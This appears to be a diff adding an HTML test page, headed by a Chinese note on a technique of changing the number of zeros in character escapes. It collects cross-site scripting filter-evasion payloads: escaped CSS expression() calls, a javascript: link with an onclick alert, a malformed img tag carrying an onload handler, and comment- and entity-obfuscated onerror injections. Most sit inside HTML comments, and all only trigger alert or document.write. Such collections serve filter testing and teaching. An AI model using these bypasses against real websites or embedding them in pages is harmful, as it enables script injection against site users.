@@ -1,0 +1,37 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>无标题文档</title>
+</head>
+
+<body>
+技巧一、改变编码中0的数量 (\0X -> \00000X)。
+<!--<p style="xss:xpression(alert(/wpulog/))">1</p>
+ <p style="xss:\065xpression(alert(/wpulog/))">2</p>
+ <p style="xss:\0065xpression(alert(/wpulog/))">ie6/7影响</p>
+ -->
+
+
+<div class="blog_comment_body" id="comment_body_2582529">
+<a target="_blank" href="javascript:String.fromCharCode(86,83,83)" onclick="alert('1')"  >2</a></div>
+<script>
+
+//document.body.innerHTML = "\u0022";
+</script>
+<img src=`<body/onload=alert(1) />
+
+<!--
+<img src="x"/**/onerror="alert('poruin')"></img>
+
+<body onload="show('&#39&#41&#59alert&#40&#391')">tom</body>
+
+<img src="x" onerror="alert('&#39;&#41;&#59document.write&#40;&#39;by:poruin')"></img>
+-->
+
+
+</body>
+
+
+
+</html>
